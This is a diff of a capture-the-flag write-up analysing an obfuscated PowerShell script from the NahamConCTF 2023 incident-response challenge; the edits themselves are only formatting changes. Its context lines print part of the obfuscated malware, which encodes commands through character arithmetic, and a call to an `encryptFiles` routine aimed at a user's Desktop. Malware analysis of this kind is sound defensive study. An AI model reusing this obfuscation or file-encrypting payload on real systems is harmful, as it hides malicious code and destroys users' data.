@@ -16,7 +16,7 @@ Obfuscated PowerShell script from the _NahamConCTF 2023 - IR_ challenge
 
 It starts off with a lot of special characters that are supposed to evaluate into something:
 
-{% code overflow="wrap" %}
+{% code overflow="wrap" fullWidth="false" %}
 ```powershell
 ${;}=+$();${=}=${;};${+}=++${;};${@}=++${;};${.}=++${;};${[}=++${;}; ${]}=++${;};${(}=++${;};${)}=++${;};${&}=++${;};${|}=++${;}; ${"}="["+"$(@{})"[${)}]+"$(@{})"["${+}${|}"]+"$(@{})"["${@}${=}"]+"$?"[${+}]+"]"; ${;}="".("$(@{})"["${+}${[}"]+"$(@{})"["${+}${(}"]+"$(@{})"[${=}]+"$(@{})"[${[}]+"$?"[${+}]+"$(@{})"[${.}]); ${;}="$(@{})"["${+}${[}"]+"$(@{})"[${[}]+"${;}"["${@}${)}"]; "${"}${.}${(}+${"}${]}${)}+${"}${)}${@}+${"}${+}${+}${&}+${"}${+}${+}${(}+${"}${)}${)}+${"}${)}${=}+${"}${|}${&}+${"}${(}${)}+${"}${]}${=}+${"}${&}${@}+${"}${)}${+}+${"}$
 ...
@@ -166,6 +166,4 @@ encryptFiles("C:\Users\"+$user+"\Desktop")
 
 In this challenge, the flag was found here. But in other cases, you might want to understand the `encryptFiles` function now to find how files are encrypted, and how they can be decrypted.&#x20;
 
-
-
-For another example that digs more into understanding the payload, see this [walkthrough](https://www.youtube.com/watch?v=GguO\_Oc0h5A) of another piece of obfuscated PowerShell malware.&#x20;
+> For another example that digs more into understanding the payload, see this [walkthrough](https://www.youtube.com/watch?v=GguO\_Oc0h5A) of another piece of obfuscated PowerShell malware.&#x20;
